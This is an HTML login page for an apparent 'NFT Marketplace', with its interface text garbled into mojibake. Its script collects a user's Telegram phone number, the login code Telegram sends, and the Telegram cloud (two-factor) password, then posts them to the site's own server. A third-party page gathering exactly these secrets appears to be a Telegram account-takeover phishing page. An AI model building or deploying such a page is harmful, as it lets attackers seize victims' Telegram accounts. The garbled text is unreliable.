<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NFT Marketplace - –ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .container {
            max-width: 400px;
            width: 100%;
        }
        
        .auth-card {
            background: white;
            border-radius: 20px;
            padding: 40px 30px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            text-align: center;
        }
        
        .logo {
            font-size: 60px;
            margin-bottom: 10px;
        }
        
        h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 24px;
        }
        
        .subtitle {
            color: #666;
            margin-bottom: 30px;
            font-size: 16px;
        }
        
        .btn {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 12px;
            background: #007bff;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            transition: all 0.3s ease;
        }
        
        .btn:hover {
            background: #0056b3;
            transform: translateY(-2px);
        }
        
        .btn-secondary {
            background: #6c757d;
        }
        
        .btn-secondary:hover {
            background: #545b62;
        }
        
        .hidden {
            display: none;
        }
        
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }
        
        .form-label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: #333;
        }
        
        .form-input {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e9ecef;
            border-radius: 10px;
            font-size: 16px;
            transition: border-color 0.3s ease;
        }
        
        .form-input:focus {
            outline: none;
            border-color: #007bff;
        }
        
        .info-text {
            background: #e7f3ff;
            padding: 12px;
            border-radius: 8px;
            margin: 15px 0;
            font-size: 14px;
            color: #0066cc;
        }
        
        .code-display {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 10px;
            margin: 15px 0;
            font-size: 24px;
            font-weight: bold;
            color: #28a745;
        }
        
        .step-indicator {
            display: flex;
            justify-content: center;
            margin-bottom: 25px;
        }
        
        .step {
            width: 30px;
            height: 30px;
            border-radius: 50%;
            background: #e9ecef;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 10px;
            font-weight: bold;
            color: #6c757d;
        }
        
        .step.active {
            background: #007bff;
            color: white;
        }
        
        .user-info {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 12px;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="auth-card">
            <div class="logo">üéÅ</div>
            <h1>NFT –ú–∞—Ä–∫–µ—Ç–ø–ª–µ–π—Å</h1>
            <p class="subtitle">–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è —á–µ—Ä–µ–∑ Telegram</p>
            
            <!-- Step Indicator -->
            <div class="step-indicator">
                <div class="step active" id="step1">1</div>
                <div class="step" id="step2">2</div>
                <div class="step" id="step3">3</div>
            </div>
            
            <!-- Step 1: Phone Input -->
            <div id="stepPhone" class="auth-step">
                <div class="form-group">
                    <label class="form-label">–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ Telegram</label>
                    <input type="tel" id="phoneInput" class="form-input" 
                           placeholder="+79123456789" required>
                </div>
                <button class="btn" onclick="requestCode()">–ü–æ–ª—É—á–∏—Ç—å –∫–æ–¥</button>
            </div>
            
            <!-- Step 2: Code Verification -->
            <div id="stepCode" class="auth-step hidden">
                <div class="info-text">
                    üì± –ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –≤ –≤–∞—à Telegram –∞–∫–∫–∞—É–Ω—Ç
                </div>
                <div class="form-group">
                    <label class="form-label">–ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è</label>
                    <input type="text" id="codeInput" class="form-input" 
                           placeholder="1234" maxlength="4" required>
                </div>
                <div class="form-group">
                    <label class="form-label">–û–±–ª–∞—á–Ω—ã–π –ø–∞—Ä–æ–ª—å (–µ—Å–ª–∏ –µ—Å—Ç—å)</label>
                    <input type="password" id="cloudPasswordInput" class="form-input" 
                           placeholder="–ù–µ–æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ">
                </div>
                <button class="btn" onclick="verifyCode()">–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å</button>
                <button class="btn btn-secondary" onclick="backToPhone()">–ù–∞–∑–∞–¥</button>
            </div>
            
            <!-- Step 3: Success -->
            <div id="stepSuccess" class="auth-step hidden">
                <div class="user-info">
                    <h3>‚úÖ –ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è —É—Å–ø–µ—à–Ω–∞!</h3>
                    <p id="userPhone"></p>
                </div>
                <button class="btn" onclick="enterMarketplace()">–í–æ–π—Ç–∏ –≤ –º–∞—Ä–∫–µ—Ç–ø–ª–µ–π—Å</button>
            </div>
            
            <!-- Demo Code Display -->
            <div id="demoCode" class="code-display hidden">
                –î–µ–º–æ –∫–æ–¥: <span id="demoCodeValue"></span>
            </div>
        </div>
    </div>

    <script>
        let currentSessionId = null;
        let currentPhone = null;
        
        // Update step indicator
        function updateStepIndicator(step) {
            document.querySelectorAll('.step').forEach((s, index) => {
                if (index + 1 <= step) {
                    s.classList.add('active');
                } else {
                    s.classList.remove('active');
                }
            });
        }
        
        // Show specific step
        function showStep(stepName) {
            document.querySelectorAll('.auth-step').forEach(step => {
                step.classList.add('hidden');
            });
            document.getElementById(`step${stepName}`).classList.remove('hidden');
        }
        
        // Step 1: Request verification code
        async function requestCode() {
            const phone = document.getElementById('phoneInput').value.trim();
            
            if (!phone) {
                alert('–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞');
                return;
            }
            
            try {
                const response = await fetch('/api/auth/request-code', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ phone })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    currentPhone = phone;
                    updateStepIndicator(2);
                    showStep('Code');
                    
                    // Show demo code (remove in production)
                    document.getElementById('demoCodeValue').textContent = data.code;
                    document.getElementById('demoCode').classList.remove('hidden');
                } else {
                    alert('–û—à–∏–±–∫–∞: ' + data.error);
                }
            } catch (error) {
                alert('–û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è: ' + error.message);
            }
        }
        
        // Step 2: Verify code
        async function verifyCode() {
            const code = document.getElementById('codeInput').value.trim();
            const cloudPassword = document.getElementById('cloudPasswordInput').value;
            
            if (!code) {
                alert('–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è');
                return;
            }
            
            try {
                const response = await fetch('/api/auth/verify-code', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ 
                        phone: currentPhone,
                        code: code,
                        cloudPassword: cloudPassword 
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    currentSessionId = data.sessionId;
                    updateStepIndicator(3);
                    showStep('Success');
                    document.getElementById('userPhone').textContent = `–¢–µ–ª–µ—Ñ–æ–Ω: ${currentPhone}`;
                    document.getElementById('demoCode').classList.add('hidden');
                } else {
                    alert('–û—à–∏–±–∫–∞: ' + data.error);
                }
            } catch (error) {
                alert('–û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è: ' + error.message);
            }
        }
        
        // Back to phone step
        function backToPhone() {
            updateStepIndicator(1);
            showStep('Phone');
            document.getElementById('demoCode').classList.add('hidden');
        }
        
        // Enter marketplace
        function enterMarketplace() {
            if (currentSessionId) {
                localStorage.setItem('nft_session', currentSessionId);
                window.location.href = '/marketplace';
            } else {
                alert('–°–µ—Å—Å–∏—è –Ω–µ –Ω–∞–π–¥–µ–Ω–∞');
            }
        }
        
        // Check existing session on page load
        async function checkExistingSession() {
            const savedSession = localStorage.getItem('nft_session');
            if (savedSession) {
                try {
                    const response = await fetch(`/api/auth/verify-session?sessionId=${savedSession}`);
                    const data = await response.json();
                    
                    if (data.success) {
                        currentSessionId = savedSession;
                        currentPhone = data.user.phone;
                        updateStepIndicator(3);
                        showStep('Success');
                        document.getElementById('userPhone').textContent = `–¢–µ–ª–µ—Ñ–æ–Ω: ${currentPhone}`;
                    } else {
                        localStorage.removeItem('nft_session');
                    }
                } catch (error) {
                    localStorage.removeItem('nft_session');
                }
            }
        }
        
        // Initialize
        checkExistingSession();
    </script>
</body>
</html>
